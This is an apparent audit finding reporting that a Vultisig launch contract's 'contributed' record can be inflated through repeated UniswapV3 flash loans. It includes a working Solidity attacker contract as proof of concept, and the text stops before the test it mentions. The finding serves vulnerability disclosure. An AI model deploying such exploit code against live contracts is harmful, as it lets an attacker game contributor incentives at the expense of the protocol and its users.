# Vulnerability details

## Impact
During the initial launch period, users can buy vultisig token from the VULT/WETH pool, for which the `contributed` state variable would record the amount of ETH the user paid to buy $VULT tokens.

However, due to the `checkWhitelist` call, anytime the pool transfers $VULT tokens during a flash loan call, the contributed amount for the recipient increases. With this, a user can call UniswapV3.flash() multiple times and transfer VULT tokens to multiple recipients while paying only the fee for the amount transferred in each call, and thus increase their amount of contributed ETH.

This would game any future referencing of `contributed` variable (e.g payment of incentives to contributors).


## Proof of Concept
1. Assume the VULT/WETH Pool has liquidity
2. The attacker sets up the malicious contract that calls the flashloan and transfers the VULT to themselves and other accounts they own in subsequent calls. But only gets to pay the flashloan fee after transferring back the borrowed amount.
3. The contributed ETH is calculated and stored for each recipient of the flashloan.

The contract and Test below proves above.

##Attacker contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IUniswapV3Pool } from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {IUniswapV3FlashCallback } from "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3FlashCallback.sol";

contract AttackContract is IUniswapV3FlashCallback {

    IUniswapV3Pool public pool;
    ERC20 public vultisig;
    constructor(ERC20 vultisig_ , IUniswapV3Pool pool_) {
        vultisig = vultisig_;
        pool = pool_;
    }

    function pocAttack(address receiver1) external {
        address[] memory receivers = new address[](2);
        receivers[0] = address(this);
        receivers[1] = receiver1;

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = vultisig.balanceOf(address(this)); //first flash is balance of vultisig tokens in contract
        amounts[1] = vultisig.balanceOf(address(this)) / 2; //second flash is half the current balance

        for (uint256 i; i < receivers.length; ++i) {


        // flash vultisig token from pool multiple times
            pool.flash(receivers[i], 0, amounts[i], abi.encode(amounts[i]));

        }

    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        uint256 amount = abi.decode(data, (uint256));
        uint returnAmount = amount + fee1;
        vultisig.transfer(address(pool), returnAmount);
    }


}
